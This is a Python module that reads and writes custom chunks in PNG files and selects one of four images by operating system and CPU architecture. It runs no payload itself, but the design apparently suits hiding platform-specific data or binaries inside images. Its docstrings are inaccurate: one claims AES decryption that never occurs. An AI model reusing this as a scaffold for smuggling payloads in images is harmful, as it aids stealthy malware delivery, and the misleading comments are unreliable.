import struct
import platform
import zlib

from .resources import IMAGES


def read_png_chunk(png_bytes, chunk_name):
    """
    Reads a specific chunk from a PNG file, decodes it, and decrypts it using AES.

    Args:
        png_bytes (bytes): The byte array representing the PNG file.
        chunk_name (str): The name of the chunk to read (e.g., "tEXt").

    Returns:
        bytes: The decrypted chunk data, or None if the chunk is not found.
    """
    # Verify PNG signature
    png_signature = b'\x89PNG\r\n\x1a\n'
    if not png_bytes.startswith(png_signature):
        return None

    offset = len(png_signature)

    while offset < len(png_bytes):
        # Read the chunk length (4 bytes, big-endian)
        chunk_length = struct.unpack(">I", png_bytes[offset:offset + 4])[0]
        offset += 4

        # Read the chunk type (4 bytes)
        chunk_type = png_bytes[offset:offset + 4].decode('ascii')
        offset += 4

        # Read the chunk data
        chunk_data = png_bytes[offset:offset + chunk_length]
        offset += chunk_length

        # Skip the CRC (4 bytes)
        offset += 4

        # Check if this is the desired chunk
        if chunk_type == chunk_name:
            return chunk_data

    # Return None if the chunk is not found
    return None


def write_png_chunk(png_bytes, chunk_name, chunk_data, insert_after, output_file):
    """
    Writes a new chunk to an existing PNG file after the bKGD chunk.

    Args:
        png_bytes (bytes): The byte array representing the PNG file.
        chunk_name (str): The name of the chunk to write (e.g., "tEXt").
        chunk_data (bytes): The data to include in the new chunk.
        output_file (str): The path to save the modified PNG file.

    Returns:
        None
    """
    # Verify PNG signature
    png_signature = b'\x89PNG\r\n\x1a\n'
    if not png_bytes.startswith(png_signature):
        raise ValueError("Invalid PNG file")

    # Split the PNG into header and chunks
    header = png_bytes[:len(png_signature)]
    chunks = png_bytes[len(png_signature):]

    # Create the new chunk
    chunk_name_bytes = chunk_name.encode('ascii')
    chunk_length = len(chunk_data)
    chunk_crc = zlib.crc32(chunk_name_bytes + chunk_data)
    new_chunk = (
        struct.pack(">I", chunk_length) +  # Chunk length (4 bytes, big-endian)
        chunk_name_bytes +                 # Chunk type (4 bytes)
        chunk_data +                       # Chunk data
        struct.pack(">I", chunk_crc)       # CRC (4 bytes, big-endian)
    )

    # Find the position of the bKGD chunk
    offset = 0
    while offset < len(chunks):
        # Read the chunk length (4 bytes, big-endian)
        chunk_length = struct.unpack(">I", chunks[offset:offset + 4])[0]
        offset += 4

        # Read the chunk type (4 bytes)
        chunk_type = chunks[offset:offset + 4].decode('ascii')
        offset += 4

        # Skip the chunk data and CRC
        offset += chunk_length + 4

        # Check if this is the bKGD chunk
        if chunk_type == insert_after:
            break

    # Write the modified PNG file
    with open(output_file, 'wb') as f:
        f.write(header)  # Write the PNG header
        f.write(chunks[:offset])  # Write chunks up to and including bKGD
        f.write(new_chunk)  # Write the new chunk
        f.write(chunks[offset:])  # Write the remaining chunks


def get_image_name():

    image_idx = None
    arch = platform.machine().lower()
    os_name = platform.system().lower()

    if os_name == "linux":
        if arch in ("x86_64", "amd64"):
            image_idx = 0
        elif arch in ("aarch64", "arm64"):
            image_idx = 1
    elif os_name == "darwin":
        if arch in ("x86_64", "amd64"):
            image_idx = 2
        elif arch in ("aarch64", "arm64"):
            image_idx = 3

    image_name = None
    if image_idx is not None:
        image_name = IMAGES[image_idx]

    return image_name
